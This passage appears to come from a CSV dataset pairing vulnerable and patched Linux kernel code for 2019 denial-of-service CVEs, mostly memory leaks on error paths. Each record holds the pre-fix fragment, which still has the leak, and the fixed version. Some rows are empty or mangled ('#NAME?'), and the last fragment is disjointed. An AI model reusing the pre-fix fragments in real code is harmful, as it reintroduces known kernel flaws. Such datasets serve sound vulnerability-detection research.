 if (construct(init_data->num_virtual_links, dc, pool))
 return &pool->base;

 kfree(pool);
 BREAK_TO_DEBUGGER();
 return NULL;
}
"
2019,DoS ,CVE-2019-19081,"		repr_priv = kzalloc(sizeof(*repr_priv), GFP_KERNEL);
 if (!repr_priv) {
			err = -ENOMEM;

 goto err_reprs_clean;
		}

		port = nfp_port_alloc(app, port_type, repr);
 if (IS_ERR(port)) {
			err = PTR_ERR(port);

 nfp_repr_free(repr);
 goto err_reprs_clean;
		}
		err = nfp_repr_init(app, repr,
				    port_id, port, priv->nn->dp.netdev);
 if (err) {

 nfp_port_free(port);
 nfp_repr_free(repr);
 goto err_reprs_clean;
","		repr_priv = kzalloc(sizeof(*repr_priv), GFP_KERNEL);
 if (!repr_priv) {
			err = -ENOMEM;
 nfp_repr_free(repr);
 goto err_reprs_clean;
		}

		port = nfp_port_alloc(app, port_type, repr);
 if (IS_ERR(port)) {
			err = PTR_ERR(port);
 kfree(repr_priv);
 nfp_repr_free(repr);
 goto err_reprs_clean;
		}
		err = nfp_repr_init(app, repr,
				    port_id, port, priv->nn->dp.netdev);
 if (err) {
 kfree(repr_priv);
 nfp_port_free(port);
 nfp_repr_free(repr);
 goto err_reprs_clean;
"
2019,DoS ,CVE-2019-19080,"		repr_priv = kzalloc(sizeof(*repr_priv), GFP_KERNEL);
 if (!repr_priv) {
			err = -ENOMEM;

 goto err_reprs_clean;
		}

		port = nfp_port_alloc(app, NFP_PORT_PHYS_PORT, repr);
 if (IS_ERR(port)) {
			err = PTR_ERR(port);

 nfp_repr_free(repr);
 goto err_reprs_clean;
		}
		err = nfp_port_init_phy_port(app->pf, app, port, i);
 if (err) {

 nfp_port_free(port);
 nfp_repr_free(repr);
 goto err_reprs_clean;
		err = nfp_repr_init(app, repr,
				    cmsg_port_id, port, priv->nn->dp.netdev);
 if (err) {

 nfp_port_free(port);
 nfp_repr_free(repr);
 goto err_reprs_clean;
","		repr_priv = kzalloc(sizeof(*repr_priv), GFP_KERNEL);
 if (!repr_priv) {
			err = -ENOMEM;
 nfp_repr_free(repr);
 goto err_reprs_clean;
		}

		port = nfp_port_alloc(app, NFP_PORT_PHYS_PORT, repr);
 if (IS_ERR(port)) {
			err = PTR_ERR(port);
 kfree(repr_priv);
 nfp_repr_free(repr);
 goto err_reprs_clean;
		}
		err = nfp_port_init_phy_port(app->pf, app, port, i);
 if (err) {
 kfree(repr_priv);
 nfp_port_free(port);
 nfp_repr_free(repr);
 goto err_reprs_clean;
		err = nfp_repr_init(app, repr,
				    cmsg_port_id, port, priv->nn->dp.netdev);
 if (err) {
 kfree(repr_priv);
 nfp_port_free(port);
 nfp_repr_free(repr);
 goto err_reprs_clean;
"
2019,DoS ,CVE-2019-19079," if (!kbuf)
 return -ENOMEM;

 if (!copy_from_iter_full(kbuf, len, from))

 return -EFAULT;


	ret = qrtr_endpoint_post(&tun->ep, kbuf, len);


 return ret < 0 ? ret : len;
}

"," if (!kbuf)
 return -ENOMEM;

 if (!copy_from_iter_full(kbuf, len, from)) {
 kfree(kbuf);
 return -EFAULT;
	}

	ret = qrtr_endpoint_post(&tun->ep, kbuf, len);

 kfree(kbuf);
 return ret < 0 ? ret : len;
}

"
2019,DoS ,CVE-2019-19078," ath10k_dbg(ar, ATH10K_DBG_USB_BULK,
 ""usb bulk transmit failed: %d\n"", ret);
 usb_unanchor_urb(urb);

			ret = -EINVAL;
 goto err_free_urb_to_pipe;
		}
"," ath10k_dbg(ar, ATH10K_DBG_USB_BULK,
 ""usb bulk transmit failed: %d\n"", ret);
 usb_unanchor_urb(urb);
 usb_free_urb(urb);
			ret = -EINVAL;
 goto err_free_urb_to_pipe;
		}
"
2019,DoS ,CVE-2019-19077," dev_err(rdev_to_dev(rdev), ""SRQ copy to udata failed!"");
 bnxt_qplib_destroy_srq(&rdev->qplib_res,
					       &srq->qplib_srq);
 goto exit;
		}
	}
 if (nq)
"," dev_err(rdev_to_dev(rdev), ""SRQ copy to udata failed!"");
 bnxt_qplib_destroy_srq(&rdev->qplib_res,
					       &srq->qplib_srq);
 goto fail;
		}
	}
 if (nq)
"
2019,DoS ,CVE-2019-19076,"	u8 mask, val;
 int err;

 if (!nfp_abm_u32_check_knode(alink->abm, knode, proto, extack))

 goto err_delete;


	tos_off = proto == htons(ETH_P_IP) ? 16 : 20;

 if ((iter->val & cmask) == (val & cmask) &&
		    iter->band != knode->res->classid) {
 NL_SET_ERR_MSG_MOD(extack, ""conflict with already offloaded filter"");

 goto err_delete;
		}
	}

 if (!match) {
		match = kzalloc(sizeof(*match), GFP_KERNEL);
 if (!match)
 return -ENOMEM;



 list_add(&match->list, &alink->dscp_map);
	}
	match->handle = knode->handle;

err_delete:
 nfp_abm_u32_knode_delete(alink, knode);
 return -EOPNOTSUPP;
}

static int nfp_abm_setup_tc_block_cb(enum tc_setup_type type,
","	u8 mask, val;
 int err;

 if (!nfp_abm_u32_check_knode(alink->abm, knode, proto, extack)) {
		err = -EOPNOTSUPP;
 goto err_delete;
	}

	tos_off = proto == htons(ETH_P_IP) ? 16 : 20;

 if ((iter->val & cmask) == (val & cmask) &&
		    iter->band != knode->res->classid) {
 NL_SET_ERR_MSG_MOD(extack, ""conflict with already offloaded filter"");
			err = -EOPNOTSUPP;
 goto err_delete;
		}
	}

 if (!match) {
		match = kzalloc(sizeof(*match), GFP_KERNEL);
 if (!match) {
			err = -ENOMEM;
 goto err_delete;
		}

 list_add(&match->list, &alink->dscp_map);
	}
	match->handle = knode->handle;

err_delete:
 nfp_abm_u32_knode_delete(alink, knode);
 return err;
}

static int nfp_abm_setup_tc_block_cb(enum tc_setup_type type,
"
2019,DoS ,CVE-2019-19075," goto error;
	}


	ret = ca8210_get_platform_data(priv->spi, pdata);
 if (ret) {
 dev_crit(&spi_device->dev, ""ca8210_get_platform_data failed\n"");
 goto error;
	}
	priv->spi->dev.platform_data = pdata;

	ret = ca8210_dev_com_init(priv);
 if (ret) {
"," goto error;
	}

	priv->spi->dev.platform_data = pdata;
	ret = ca8210_get_platform_data(priv->spi, pdata);
 if (ret) {
 dev_crit(&spi_device->dev, ""ca8210_get_platform_data failed\n"");
 goto error;
	}


	ret = ca8210_dev_com_init(priv);
 if (ret) {
"
2019,DoS ,CVE-2019-19074," ath_dbg(common, WMI, ""Timeout waiting for WMI command: %s\n"",
 wmi_cmd_to_name(cmd_id));
 mutex_unlock(&wmi->op_mutex);

 return -ETIMEDOUT;
	}

"," ath_dbg(common, WMI, ""Timeout waiting for WMI command: %s\n"",
 wmi_cmd_to_name(cmd_id));
 mutex_unlock(&wmi->op_mutex);
 kfree_skb(skb);
 return -ETIMEDOUT;
	}

"
2019,DoS ,CVE-2019-19073,"	time_left = wait_for_completion_timeout(&target->cmd_wait, HZ);
 if (!time_left) {
 dev_err(target->dev, ""HTC credit config timeout\n"");

 return -ETIMEDOUT;
	}

	time_left = wait_for_completion_timeout(&target->cmd_wait, HZ);
 if (!time_left) {
 dev_err(target->dev, ""HTC start timeout\n"");

 return -ETIMEDOUT;
	}

 if (!time_left) {
 dev_err(target->dev, ""Service connection timeout for: %d\n"",
			service_connreq->service_id);

 return -ETIMEDOUT;
	}

","	time_left = wait_for_completion_timeout(&target->cmd_wait, HZ);
 if (!time_left) {
 dev_err(target->dev, ""HTC credit config timeout\n"");
 kfree_skb(skb);
 return -ETIMEDOUT;
	}

	time_left = wait_for_completion_timeout(&target->cmd_wait, HZ);
 if (!time_left) {
 dev_err(target->dev, ""HTC start timeout\n"");
 kfree_skb(skb);
 return -ETIMEDOUT;
	}

 if (!time_left) {
 dev_err(target->dev, ""Service connection timeout for: %d\n"",
			service_connreq->service_id);
 kfree_skb(skb);
 return -ETIMEDOUT;
	}

"
2019,DoS ,CVE-2019-19072,"
 switch (*next) {
 case '(':					/* #2 */
 if (top - op_stack > nr_parens)
 return ERR_PTR(-EINVAL);


			*(++top) = invert;
 continue;
 case '!':					/* #3 */
","
 switch (*next) {
 case '(':					/* #2 */
 if (top - op_stack > nr_parens) {
				ret = -EINVAL;
 goto out_free;
			}
			*(++top) = invert;
 continue;
 case '!':					/* #3 */
"
2019,DoS ,CVE-2019-19071," skb_pull(skb, (64 - dword_align_bytes));
 if (rsi_prepare_beacon(common, skb)) {
 rsi_dbg(ERR_ZONE, ""Failed to prepare beacon\n"");

 return -EINVAL;
	}
 skb_queue_tail(&common->tx_queue[MGMT_BEACON_Q], skb);
"," skb_pull(skb, (64 - dword_align_bytes));
 if (rsi_prepare_beacon(common, skb)) {
 rsi_dbg(ERR_ZONE, ""Failed to prepare beacon\n"");
 dev_kfree_skb(skb);
 return -EINVAL;
	}
 skb_queue_tail(&common->tx_queue[MGMT_BEACON_Q], skb);
"
2019,DoS ,CVE-2019-19070," return -ENOMEM;

	status = devm_add_action_or_reset(&pdev->dev, spi_gpio_put, master);
 if (status)

 return status;


 if (of_id)
		status = spi_gpio_probe_dt(pdev, master);
"," return -ENOMEM;

	status = devm_add_action_or_reset(&pdev->dev, spi_gpio_put, master);
 if (status) {
 spi_master_put(master);
 return status;
	}

 if (of_id)
		status = spi_gpio_probe_dt(pdev, master);
"
2019,DoS ,CVE-2019-19069," FASTRPC_PHYS(buffer->phys), buffer->size);
 if (ret < 0) {
 dev_err(buffer->dev, ""failed to get scatterlist from DMA API\n"");

 return -EINVAL;
	}

"," FASTRPC_PHYS(buffer->phys), buffer->size);
 if (ret < 0) {
 dev_err(buffer->dev, ""failed to get scatterlist from DMA API\n"");
 kfree(a);
 return -EINVAL;
	}

"
2019,DoS ,CVE-2019-19068,"	ret = usb_submit_urb(urb, GFP_KERNEL);
 if (ret) {
 usb_unanchor_urb(urb);

 goto error;
	}

","	ret = usb_submit_urb(urb, GFP_KERNEL);
 if (ret) {
 usb_unanchor_urb(urb);
 usb_free_urb(urb);
 goto error;
	}

"
2019,DoS ,CVE-2019-19067,"	u32 val = 0;
	u32 count = 0;
 struct device *dev;
 struct i2s_platform_data *i2s_pdata;

 struct amdgpu_device *adev = (struct amdgpu_device *)handle;

	adev->acp.acp_cell = kcalloc(ACP_DEVS, sizeof(struct mfd_cell),
							GFP_KERNEL);

 if (adev->acp.acp_cell == NULL)
 return -ENOMEM;



	adev->acp.acp_res = kcalloc(5, sizeof(struct resource), GFP_KERNEL);
 if (adev->acp.acp_res == NULL) {
 kfree(adev->acp.acp_cell);
 return -ENOMEM;
	}

	i2s_pdata = kcalloc(3, sizeof(struct i2s_platform_data), GFP_KERNEL);
 if (i2s_pdata == NULL) {
 kfree(adev->acp.acp_res);
 kfree(adev->acp.acp_cell);
 return -ENOMEM;
	}

 switch (adev->asic_type) {
	r = mfd_add_hotplug_devices(adev->acp.parent, adev->acp.acp_cell,
								ACP_DEVS);
 if (r)
 return r;

 for (i = 0; i < ACP_DEVS ; i++) {
		dev = get_mfd_cell_dev(adev->acp.acp_cell[i].name, i);
		r = pm_genpd_add_device(&adev->acp.acp_genpd->gpd, dev);
 if (r) {
 dev_err(dev, ""Failed to add dev to genpd\n"");
 return r;
		}
	}

 break;
 if (--count == 0) {
 dev_err(&adev->pdev->dev, ""Failed to reset ACP\n"");
 return -ETIMEDOUT;

		}
 udelay(100);
	}
 break;
 if (--count == 0) {
 dev_err(&adev->pdev->dev, ""Failed to reset ACP\n"");
 return -ETIMEDOUT;

		}
 udelay(100);
	}
	val &= ~ACP_SOFT_RESET__SoftResetAud_MASK;
 cgs_write_register(adev->acp.cgs_device, mmACP_SOFT_RESET, val);
 return 0;







}

/**
","	u32 val = 0;
	u32 count = 0;
 struct device *dev;
 struct i2s_platform_data *i2s_pdata = NULL;

 struct amdgpu_device *adev = (struct amdgpu_device *)handle;

	adev->acp.acp_cell = kcalloc(ACP_DEVS, sizeof(struct mfd_cell),
							GFP_KERNEL);

 if (adev->acp.acp_cell == NULL) {
		r = -ENOMEM;
 goto failure;
	}

	adev->acp.acp_res = kcalloc(5, sizeof(struct resource), GFP_KERNEL);
 if (adev->acp.acp_res == NULL) {
 r = -ENOMEM;
 goto failure;
	}

	i2s_pdata = kcalloc(3, sizeof(struct i2s_platform_data), GFP_KERNEL);
 if (i2s_pdata == NULL) {
		r = -ENOMEM;
 goto failure;

	}

 switch (adev->asic_type) {
	r = mfd_add_hotplug_devices(adev->acp.parent, adev->acp.acp_cell,
								ACP_DEVS);
 if (r)
 goto failure;

 for (i = 0; i < ACP_DEVS ; i++) {
		dev = get_mfd_cell_dev(adev->acp.acp_cell[i].name, i);
		r = pm_genpd_add_device(&adev->acp.acp_genpd->gpd, dev);
 if (r) {
 dev_err(dev, ""Failed to add dev to genpd\n"");
 goto failure;
		}
	}

 break;
 if (--count == 0) {
 dev_err(&adev->pdev->dev, ""Failed to reset ACP\n"");
			r = -ETIMEDOUT;
 goto failure;
		}
 udelay(100);
	}
 break;
 if (--count == 0) {
 dev_err(&adev->pdev->dev, ""Failed to reset ACP\n"");
			r = -ETIMEDOUT;
 goto failure;
		}
 udelay(100);
	}
	val &= ~ACP_SOFT_RESET__SoftResetAud_MASK;
 cgs_write_register(adev->acp.cgs_device, mmACP_SOFT_RESET, val);
 return 0;

failure:
 kfree(i2s_pdata);
 kfree(adev->acp.acp_res);
 kfree(adev->acp.acp_cell);
 kfree(adev->acp.acp_genpd);
 return r;
}

/**
"
2019,DoS ,CVE-2019-19066,"	rc = bfa_port_get_stats(BFA_FCPORT(&bfad->bfa),
				fcstats, bfad_hcb_comp, &fcomp);
 spin_unlock_irqrestore(&bfad->bfad_lock, flags);
 if (rc != BFA_STATUS_OK)

 return NULL;


 wait_for_completion(&fcomp.comp);

","	rc = bfa_port_get_stats(BFA_FCPORT(&bfad->bfa),
				fcstats, bfad_hcb_comp, &fcomp);
 spin_unlock_irqrestore(&bfad->bfad_lock, flags);
 if (rc != BFA_STATUS_OK) {
 kfree(fcstats);
 return NULL;
	}

 wait_for_completion(&fcomp.comp);

"
2019,DoS ,CVE-2019-19065,"	}

	ret = rhashtable_init(tmp_sdma_rht, &sdma_rht_params);
 if (ret < 0)

 goto bail;


	dd->sdma_rht = tmp_sdma_rht;

 dd_dev_info(dd, ""SDMA num_sdma: %u\n"", dd->num_sdma);
","	}

	ret = rhashtable_init(tmp_sdma_rht, &sdma_rht_params);
 if (ret < 0) {
 kfree(tmp_sdma_rht);
 goto bail;
	}

	dd->sdma_rht = tmp_sdma_rht;

 dd_dev_info(dd, ""SDMA num_sdma: %u\n"", dd->num_sdma);
"
2019,DoS ,CVE-2019-19064,"	ret = pm_runtime_get_sync(fsl_lpspi->dev);
 if (ret < 0) {
 dev_err(fsl_lpspi->dev, ""failed to enable clock\n"");
 return ret;
	}

	temp = readl(fsl_lpspi->base + IMX7ULP_PARAM);
","	ret = pm_runtime_get_sync(fsl_lpspi->dev);
 if (ret < 0) {
 dev_err(fsl_lpspi->dev, ""failed to enable clock\n"");
 goto out_controller_put;
	}

	temp = readl(fsl_lpspi->base + IMX7ULP_PARAM);
"
2019,DoS ,CVE-2019-19063,"	rtlpriv->hw = hw;
	rtlpriv->usb_data = kcalloc(RTL_USB_MAX_RX_COUNT, sizeof(u32),
				    GFP_KERNEL);
 if (!rtlpriv->usb_data)

 return -ENOMEM;


 /* this spin lock must be initialized early */
 spin_lock_init(&rtlpriv->locks.usb_lock);
 _rtl_usb_io_handler_release(hw);
 usb_put_dev(udev);
 complete(&rtlpriv->firmware_loading_complete);

 return -ENODEV;
}
EXPORT_SYMBOL(rtl_usb_probe);
","	rtlpriv->hw = hw;
	rtlpriv->usb_data = kcalloc(RTL_USB_MAX_RX_COUNT, sizeof(u32),
				    GFP_KERNEL);
 if (!rtlpriv->usb_data) {
 ieee80211_free_hw(hw);
 return -ENOMEM;
	}

 /* this spin lock must be initialized early */
 spin_lock_init(&rtlpriv->locks.usb_lock);
 _rtl_usb_io_handler_release(hw);
 usb_put_dev(udev);
 complete(&rtlpriv->firmware_loading_complete);
 kfree(rtlpriv->usb_data);
 return -ENODEV;
}
EXPORT_SYMBOL(rtl_usb_probe);
"
2019,DoS ,CVE-2019-19062,"drop_alg:
 crypto_mod_put(alg);

 if (err)

 return err;


 return nlmsg_unicast(net->crypto_nlsk, skb, NETLINK_CB(in_skb).portid);
}
","drop_alg:
 crypto_mod_put(alg);

 if (err) {
 kfree_skb(skb);
 return err;
	}

 return nlmsg_unicast(net->crypto_nlsk, skb, NETLINK_CB(in_skb).portid);
}
"
2019,DoS ,CVE-2019-19061," return -ENOMEM;

	adis->buffer = kzalloc(burst_length + sizeof(u16), GFP_KERNEL);
 if (!adis->buffer)


 return -ENOMEM;


	tx = adis->buffer + burst_length;
	tx[0] = ADIS_READ_REG(adis->burst->reg_cmd);
"," return -ENOMEM;

	adis->buffer = kzalloc(burst_length + sizeof(u16), GFP_KERNEL);
 if (!adis->buffer) {
 kfree(adis->xfer);
		adis->xfer = NULL;
 return -ENOMEM;
	}

	tx = adis->buffer + burst_length;
	tx[0] = ADIS_READ_REG(adis->burst->reg_cmd);
"
2019,DoS ,CVE-2019-19060," return -ENOMEM;

	adis->buffer = kcalloc(indio_dev->scan_bytes, 2, GFP_KERNEL);
 if (!adis->buffer)


 return -ENOMEM;


	rx = adis->buffer;
	tx = rx + scan_count;
"," return -ENOMEM;

	adis->buffer = kcalloc(indio_dev->scan_bytes, 2, GFP_KERNEL);
 if (!adis->buffer) {
 kfree(adis->xfer);
		adis->xfer = NULL;
 return -ENOMEM;
	}

	rx = adis->buffer;
	tx = rx + scan_count;
"
2019,DoS ,CVE-2019-19059,"
 /* allocate ucode sections in dram and set addresses */
	ret = iwl_pcie_init_fw_sec(trans, fw, &prph_scratch->dram);
 if (ret) {
 dma_free_coherent(trans->dev,
 sizeof(*prph_scratch),
				  prph_scratch,
				  trans_pcie->prph_scratch_dma_addr);
 return ret;
	}

 /* Allocate prph information
	 * currently we don't assign to the prph info anything, but it would get
	 * assigned later */
	prph_info = dma_alloc_coherent(trans->dev, sizeof(*prph_info),
				       &trans_pcie->prph_info_dma_addr,
				       GFP_KERNEL);
 if (!prph_info)
 return -ENOMEM;



 /* Allocate context info */
	ctxt_info_gen3 = dma_alloc_coherent(trans->dev,
 sizeof(*ctxt_info_gen3),
					    &trans_pcie->ctxt_info_dma_addr,
					    GFP_KERNEL);
 if (!ctxt_info_gen3)
 return -ENOMEM;



	ctxt_info_gen3->prph_info_base_addr =
 cpu_to_le64(trans_pcie->prph_info_dma_addr);
 iwl_set_bit(trans, CSR_GP_CNTRL, CSR_AUTO_FUNC_INIT);

 return 0;














}

void iwl_pcie_ctxt_info_gen3_free(struct iwl_trans *trans)
","
 /* allocate ucode sections in dram and set addresses */
	ret = iwl_pcie_init_fw_sec(trans, fw, &prph_scratch->dram);
 if (ret)
 goto err_free_prph_scratch;






 /* Allocate prph information
	 * currently we don't assign to the prph info anything, but it would get
	 * assigned later */
	prph_info = dma_alloc_coherent(trans->dev, sizeof(*prph_info),
				       &trans_pcie->prph_info_dma_addr,
				       GFP_KERNEL);
 if (!prph_info) {
		ret = -ENOMEM;
 goto err_free_prph_scratch;
	}

 /* Allocate context info */
	ctxt_info_gen3 = dma_alloc_coherent(trans->dev,
 sizeof(*ctxt_info_gen3),
					    &trans_pcie->ctxt_info_dma_addr,
					    GFP_KERNEL);
 if (!ctxt_info_gen3) {
		ret = -ENOMEM;
 goto err_free_prph_info;
	}

	ctxt_info_gen3->prph_info_base_addr =
 cpu_to_le64(trans_pcie->prph_info_dma_addr);
 iwl_set_bit(trans, CSR_GP_CNTRL, CSR_AUTO_FUNC_INIT);

 return 0;

err_free_prph_info:
 dma_free_coherent(trans->dev,
 sizeof(*prph_info),
			prph_info,
			trans_pcie->prph_info_dma_addr);

err_free_prph_scratch:
 dma_free_coherent(trans->dev,
 sizeof(*prph_scratch),
			prph_scratch,
			trans_pcie->prph_scratch_dma_addr);
 return ret;

}

void iwl_pcie_ctxt_info_gen3_free(struct iwl_trans *trans)
"
2019,DoS ,CVE-2019-19058," if (new_page)
 __free_page(new_page);
			}

 return NULL;
		}
		alloc_size = min_t(int, size, PAGE_SIZE);
"," if (new_page)
 __free_page(new_page);
			}
 kfree(table);
 return NULL;
		}
		alloc_size = min_t(int, size, PAGE_SIZE);
"
2019,DoS ,CVE-2019-19057," skb_put(skb, MAX_EVENT_SIZE);

 if (mwifiex_map_pci_memory(adapter, skb, MAX_EVENT_SIZE,
					   PCI_DMA_FROMDEVICE))


 return -1;


		buf_pa = MWIFIEX_SKB_DMA_ADDR(skb);

"," skb_put(skb, MAX_EVENT_SIZE);

 if (mwifiex_map_pci_memory(adapter, skb, MAX_EVENT_SIZE,
					   PCI_DMA_FROMDEVICE)) {
 kfree_skb(skb);
 kfree(card->evtbd_ring_vbase);
 return -1;
		}

		buf_pa = MWIFIEX_SKB_DMA_ADDR(skb);

"
2019,DoS ,CVE-2019-19056,"	}
 skb_put(skb, MWIFIEX_UPLD_SIZE);
 if (mwifiex_map_pci_memory(adapter, skb, MWIFIEX_UPLD_SIZE,
				   PCI_DMA_FROMDEVICE))

 return -1;


	card->cmdrsp_buf = skb;

","	}
 skb_put(skb, MWIFIEX_UPLD_SIZE);
 if (mwifiex_map_pci_memory(adapter, skb, MWIFIEX_UPLD_SIZE,
				   PCI_DMA_FROMDEVICE)) {
 kfree_skb(skb);
 return -1;
	}

	card->cmdrsp_buf = skb;

"
2019,DoS ,CVE-2019-19055,"	hdr = nl80211hdr_put(msg, info->snd_portid, info->snd_seq, 0,
			     NL80211_CMD_GET_FTM_RESPONDER_STATS);
 if (!hdr)
 return -ENOBUFS;

 if (nla_put_u32(msg, NL80211_ATTR_IFINDEX, dev->ifindex))
 goto nla_put_failure;
","	hdr = nl80211hdr_put(msg, info->snd_portid, info->snd_seq, 0,
			     NL80211_CMD_GET_FTM_RESPONDER_STATS);
 if (!hdr)
 goto nla_put_failure;

 if (nla_put_u32(msg, NL80211_ATTR_IFINDEX, dev->ifindex))
 goto nla_put_failure;
"
2019,DoS ,CVE-2019-19054," return -ENOMEM;

 spin_lock_init(&state->rx_kfifo_lock);
 if (kfifo_alloc(&state->rx_kfifo, CX23888_IR_RX_KFIFO_SIZE, GFP_KERNEL))


 return -ENOMEM;


	state->dev = dev;
	sd = &state->sd;
"," return -ENOMEM;

 spin_lock_init(&state->rx_kfifo_lock);
 if (kfifo_alloc(&state->rx_kfifo, CX23888_IR_RX_KFIFO_SIZE,
			GFP_KERNEL)) {
 kfree(state);
 return -ENOMEM;
	}

	state->dev = dev;
	sd = &state->sd;
"
2019,DoS ,CVE-2019-19053," if (!kbuf)
 return -ENOMEM;

 if (!copy_from_iter_full(kbuf, len, from))
 return -EFAULT;



 if (mutex_lock_interruptible(&eptdev->ept_lock)) {
		ret = -ERESTARTSYS;
"," if (!kbuf)
 return -ENOMEM;

 if (!copy_from_iter_full(kbuf, len, from)) {
		ret = -EFAULT;
 goto free_kbuf;
	}

 if (mutex_lock_interruptible(&eptdev->ept_lock)) {
		ret = -ERESTARTSYS;
"
2019,DoS ,CVE-2019-19052,"					   rc);

 usb_unanchor_urb(urb);

 break;
			}

","					   rc);

 usb_unanchor_urb(urb);
 usb_free_urb(urb);
 break;
			}

"
2019,DoS ,CVE-2019-19051," ""%d\n"", result);
	result = 0;
error_cmd:
 kfree(cmd);
 kfree_skb(ack_skb);
error_msg_to_dev:
error_alloc:
 d_fnend(4, dev, ""(wimax_dev %p state %d) = %d\n"",
		wimax_dev, state, result);

 return result;
}

"," ""%d\n"", result);
	result = 0;
error_cmd:

 kfree_skb(ack_skb);
error_msg_to_dev:
error_alloc:
 d_fnend(4, dev, ""(wimax_dev %p state %d) = %d\n"",
		wimax_dev, state, result);
 kfree(cmd);
 return result;
}

"
2019,DoS ,CVE-2019-19050,"drop_alg:
 crypto_mod_put(alg);

 if (err)

 return err;


 return nlmsg_unicast(net->crypto_nlsk, skb, NETLINK_CB(in_skb).portid);
}
","drop_alg:
 crypto_mod_put(alg);

 if (err) {
 kfree_skb(skb);
 return err;
	}

 return nlmsg_unicast(net->crypto_nlsk, skb, NETLINK_CB(in_skb).portid);
}
"
2019,DoS ,CVE-2019-19049," of_fdt_unflatten_tree(unittest_data, NULL, &unittest_data_node);
 if (!unittest_data_node) {
 pr_warn(""%s: No tree to attach; not running tests\n"", __func__);

 return -ENODATA;
	}

"," of_fdt_unflatten_tree(unittest_data, NULL, &unittest_data_node);
 if (!unittest_data_node) {
 pr_warn(""%s: No tree to attach; not running tests\n"", __func__);
 kfree(unittest_data);
 return -ENODATA;
	}

"
2019,DoS ,CVE-2019-19048," if (!bounce_buf)
 return -ENOMEM;



 if (copy_in) {
		ret = copy_from_user(bounce_buf, (void __user *)buf, len);
 if (ret)
 memset(bounce_buf, 0, len);
	}

	*bounce_buf_ret = bounce_buf;
 hgcm_call_add_pagelist_size(bounce_buf, len, extra);
 return 0;
}
"," if (!bounce_buf)
 return -ENOMEM;

	*bounce_buf_ret = bounce_buf;

 if (copy_in) {
		ret = copy_from_user(bounce_buf, (void __user *)buf, len);
 if (ret)
 memset(bounce_buf, 0, len);
	}


 hgcm_call_add_pagelist_size(bounce_buf, len, extra);
 return 0;
}
"
2019,DoS ,CVE-2019-19047," return -ENOMEM;
	err = mlx5_crdump_collect(dev, cr_data);
 if (err)
 return err;

 if (priv_ctx) {
 struct mlx5_fw_reporter_ctx *fw_reporter_ctx = priv_ctx;
"," return -ENOMEM;
	err = mlx5_crdump_collect(dev, cr_data);
 if (err)
 goto free_data;

 if (priv_ctx) {
 struct mlx5_fw_reporter_ctx *fw_reporter_ctx = priv_ctx;
"
2019,DoS ,CVE-2019-19046,"		bmc->pdev.name = ""ipmi_bmc"";

		rv = ida_simple_get(&ipmi_bmc_ida, 0, 0, GFP_KERNEL);
 if (rv < 0)

 goto out;


		bmc->pdev.dev.driver = &ipmidriver.driver;
		bmc->pdev.id = rv;
		bmc->pdev.dev.release = release_bmc_device;
","		bmc->pdev.name = ""ipmi_bmc"";

		rv = ida_simple_get(&ipmi_bmc_ida, 0, 0, GFP_KERNEL);
 if (rv < 0) {
 kfree(bmc);
 goto out;
		}

		bmc->pdev.dev.driver = &ipmidriver.driver;
		bmc->pdev.id = rv;
		bmc->pdev.dev.release = release_bmc_device;
"
2019,DoS ,CVE-2019-19045,"	}

	err = mlx5_vector2eqn(mdev, smp_processor_id(), &eqn, &irqn);
 if (err)

 goto err_cqwq;


	cqc = MLX5_ADDR_OF(create_cq_in, in, cq_context);
 MLX5_SET(cqc, cqc, log_cq_size, ilog2(cq_size));
","	}

	err = mlx5_vector2eqn(mdev, smp_processor_id(), &eqn, &irqn);
 if (err) {
 kvfree(in);
 goto err_cqwq;
	}

	cqc = MLX5_ADDR_OF(create_cq_in, in, cq_context);
 MLX5_SET(cqc, cqc, log_cq_size, ilog2(cq_size));
"
2019,DoS ,CVE-2019-19044,"
 if (args->bcl_start != args->bcl_end) {
		bin = kcalloc(1, sizeof(*bin), GFP_KERNEL);
 if (!bin)

 return -ENOMEM;


		ret = v3d_job_init(v3d, file_priv, &bin->base,
				   v3d_job_free, args->in_sync_bcl);
 if (ret) {
 v3d_job_put(&render->base);

 return ret;
		}

","
 if (args->bcl_start != args->bcl_end) {
		bin = kcalloc(1, sizeof(*bin), GFP_KERNEL);
 if (!bin) {
 v3d_job_put(&render->base);
 return -ENOMEM;
		}

		ret = v3d_job_init(v3d, file_priv, &bin->base,
				   v3d_job_free, args->in_sync_bcl);
 if (ret) {
 v3d_job_put(&render->base);
 kfree(bin);
 return ret;
		}

"
2019,DoS ,CVE-2019-19043,"		ch->num_queue_pairs = qcnt;
 if (!i40e_setup_channel(pf, vsi, ch)) {
			ret = -EINVAL;

 goto err_free;
		}
		ch->parent_vsi = vsi;
","		ch->num_queue_pairs = qcnt;
 if (!i40e_setup_channel(pf, vsi, ch)) {
			ret = -EINVAL;
 kfree(ch);
 goto err_free;
		}
		ch->parent_vsi = vsi;
"
2019,#NAME?,CVE-2019-19039,,
2019,,CVE-2019-19037,,
2019,,CVE-2019-19036,,
2019,Exec Code ,CVE-2019-18910,,
2019,,CVE-2019-18885," case BTRFS_IOCTL_DEV_REPLACE_STATE_STARTED:
 case BTRFS_IOCTL_DEV_REPLACE_STATE_SUSPENDED:
		dev_replace->srcdev = btrfs_find_device(fs_info->fs_devices,
  src_devid, NULL, NULL);
		dev_replace->tgtdev = btrfs_find_device(fs_info->fs_devices,
							BTRFS_DEV_REPLACE_DEVID,
 NULL, NULL);
 /*
		 * allow 'btrfs dev replace_cancel' if src/tgt device is
		 * missing
 btrfs_info(fs_info, ""resizing devid %llu"", devid);
	}

	device = btrfs_find_device(fs_info->fs_devices, devid, NULL, NULL);
 if (!device) {
 btrfs_info(fs_info, ""resizer unable to find device %llu"",
			   devid);

 rcu_read_lock();
	dev = btrfs_find_device(fs_info->fs_devices, di_args->devid, s_uuid,
 NULL);

 if (!dev) {
		ret = -ENODEV;
 return PTR_ERR(sctx);

 mutex_lock(&fs_info->fs_devices->device_list_mutex);
	dev = btrfs_find_device(fs_info->fs_devices, devid, NULL, NULL);
 if (!dev || (test_bit(BTRFS_DEV_STATE_MISSING, &dev->dev_state) &&
		     !is_dev_replace)) {
 mutex_unlock(&fs_info->fs_devices->device_list_mutex);
 struct scrub_ctx *sctx = NULL;

 mutex_lock(&fs_info->fs_devices->device_list_mutex);
	dev = btrfs_find_device(fs_info->fs_devices, devid, NULL, NULL);
 if (dev)
		sctx = dev->scrub_ctx;
 if (sctx)
 return dev;
}

/*
 * Find a device specified by @devid or @uuid in the list of @fs_devices, or
 * return NULL.
 *
 * If devid and uuid are both specified, the match must be exact, otherwise
 * only devid is used.
 */
static struct btrfs_device *find_device(struct btrfs_fs_devices *fs_devices,
		u64 devid, const u8 *uuid)
{
 struct btrfs_device *dev;

